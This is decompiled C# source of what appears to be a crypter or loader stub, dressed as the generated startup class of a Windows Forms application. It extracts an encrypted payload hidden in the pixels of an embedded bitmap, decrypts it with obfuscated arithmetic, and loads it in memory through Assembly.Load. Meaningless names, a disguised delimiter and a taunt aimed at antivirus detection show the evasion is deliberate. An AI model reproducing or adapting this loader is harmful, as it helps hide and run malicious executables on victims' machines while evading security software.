using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using asa.My.Resources;

namespace asa.My;

[EditorBrowsable(EditorBrowsableState.Never)]
[GeneratedCode("MyTemplate", "8.0.0.0")]
internal class MyApplication : WindowsFormsApplicationBase
{
	public int zero;

	public string fdd;

	private string fdd2;

	private byte[] input;

	private object key;

	[AccessedThroughProperty("jjj")]
	private AppDomain _jjj;

	public virtual AppDomain jjj
	{
		get
		{
			return _jjj;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ResolveEventHandler value2 = (object a0, ResolveEventArgs a1) => (Assembly)yyy(RuntimeHelpers.GetObjectValue(a0), a1);
			if (_jjj != null)
			{
				_jjj.AssemblyResolve -= value2;
			}
			_jjj = value;
			if (_jjj != null)
			{
				_jjj.AssemblyResolve += value2;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	[DebuggerHidden]
	[STAThread]
	internal static void Main(string[] args)
	{
		try
		{
			Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.get_UseCompatibleTextRendering());
		}
		finally
		{
		}
		((WindowsFormsApplicationBase)MyProject.Application).Run(args);
	}

	public object troll(int z, int y)
	{
		return Operators.SubtractObject(Operators.SubtractObject((object)checked(2 * z), key), (object)y);
	}

	public object troll2(int z, int y)
	{
		return Operators.AddObject(Operators.SubtractObject(key, (object)y), (object)z);
	}

	public object meh(int nb)
	{
		return nb % 256;
	}

	public bool meuuuuh(int v)
	{
		if (v < zero)
		{
			return true;
		}
		return false;
	}

	public void jaja(int index, int equal)
	{
		input[index] = Conversions.ToByte(meh(equal));
	}

	public byte[] dcrp()
	{
		checked
		{
			for (int i = 0; i <= input.Length - 2; i += 2)
			{
				int y = input[i];
				int z = input[i + 1];
				string text = Conversions.ToString(troll(z, y));
				string text2 = Conversions.ToString(troll2(z, y));
				while (meuuuuh(Conversions.ToInteger(text2)) | meuuuuh(Conversions.ToInteger(text)))
				{
					if (meuuuuh(Conversions.ToInteger(text2)))
					{
						text2 = Conversions.ToString(Conversions.ToDouble(text2) + 256.0);
					}
					if (meuuuuh(Conversions.ToInteger(text)))
					{
						text = Conversions.ToString(Conversions.ToDouble(text) + 256.0);
					}
				}
				jaja(i, Conversions.ToInteger(text2));
				jaja(i + 1, Conversions.ToInteger(text));
			}
			return input;
		}
	}

	public object gstr(byte[] bytes)
	{
		return Encoding.Default.GetString(bytes);
	}

	public byte ssc(char str)
	{
		return checked((byte)Strings.Asc(str));
	}

	public byte[] gbyt(string str)
	{
		char[] array = str.ToCharArray();
		checked
		{
			byte[] array2 = new byte[array.Length - 1 + 1];
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array2[i] = ssc(array[i]);
			}
			return array2;
		}
	}

	public static byte[] rab(string path)
	{
		FileInfo fileInfo = new FileInfo(path);
		FileStream fileStream = fileInfo.OpenRead();
		FileInfo fileInfo2 = new FileInfo(path);
		checked
		{
			byte[] array = new byte[(int)(fileInfo2.Length - 1L) + 1];
			fileStream.Read(array, 0, (int)fileInfo2.Length);
			fileStream.Dispose();
			return array;
		}
	}

	public char bonjour(int jj)
	{
		return Strings.Chr(jj);
	}

	public string bts(Bitmap BMP)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		Bitmap val = new Bitmap((Image)(object)BMP, ((Image)BMP).get_Width(), ((Image)BMP).get_Height());
		checked
		{
			int num = ((Image)BMP).get_Height() - 1;
			string text = default(string);
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)BMP).get_Width() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = val.GetPixel(j, i);
					text = text + Conversions.ToString(bonjour(pixel.R)) + Conversions.ToString(bonjour(pixel.G)) + Conversions.ToString(bonjour(pixel.B));
				}
			}
			return text;
		}
	}

	public void exetostr()
	{
		fdd = bts(asa.My.Resources.Resources.fffffff);
	}

	public object unknown(bool pos)
	{
		int num = default(int);
		switch (pos)
		{
		case false:
			num = 4;
			break;
		case true:
			num = 1;
			break;
		}
		return spt(fdd, fdd2, -1, (CompareMethod)0)[num];
	}

	public static string[] spt(string Expression, string Delimiter = " ", int Limit = -1, CompareMethod Compare = 0)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (Expression == null || Expression.Length == 0)
			{
				return new string[1] { "" };
			}
			if (Limit == -1)
			{
				Limit = checked(Expression.Length + 1);
			}
			if ((Delimiter?.Length ?? 0) == 0)
			{
				return new string[1] { Expression };
			}
			return Strings.Split(Expression, Delimiter, Limit, Compare);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Exception ex3 = ex2;
			throw ex3;
		}
	}

	public object yyy(object sender, ResolveEventArgs args)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] obj = default(byte[]);
		object obj2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 133:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_002b;
						case 5:
							goto IL_0040;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0040:
					num = 5;
					obj = dcrp();
					break;
					IL_0007:
					num = 2;
					exetostr();
					goto IL_0010;
					IL_0010:
					num = 3;
					input = gbyt(Conversions.ToString(unknown(pos: true)));
					goto IL_002b;
					IL_002b:
					num = 4;
					key = RuntimeHelpers.GetObjectValue(unknown(pos: false));
					goto IL_0040;
					end_IL_0000_2:
					break;
				}
				num = 6;
				obj2 = tt(obj);
				break;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 133;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		object result = obj2;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public object tt(object obj)
	{
		Type typeFromHandle = typeof(Assembly);
		object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
		bool[] array2 = new bool[1] { true };
		object result = NewLateBinding.LateGet((object)null, typeFromHandle, "Load", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			obj = RuntimeHelpers.GetObjectValue(array[0]);
			return result;
		}
		return result;
	}

	[DebuggerStepThrough]
	public MyApplication()
		: base((AuthenticationMode)0)
	{
		zero = 0;
		fdd2 = "$7$X$0$Z$$$x$$q$$5$fJ$aB$8$y$6$J$$4$h$b$u$Z".Replace("$", null).Replace("you should find better things to detect seriously", null);
		jjj = AppDomain.CurrentDomain;
		((WindowsFormsApplicationBase)this).set_IsSingleInstance(false);
		((WindowsFormsApplicationBase)this).set_EnableVisualStyles(true);
		((WindowsFormsApplicationBase)this).set_SaveMySettingsOnExit(true);
		((WindowsFormsApplicationBase)this).set_ShutdownStyle((ShutdownMode)0);
	}

	[DebuggerStepThrough]
	protected override void OnCreateMainForm()
	{
		((WindowsFormsApplicationBase)this).set_MainForm((Form)(object)MyProject.Forms.Form2);
	}
}
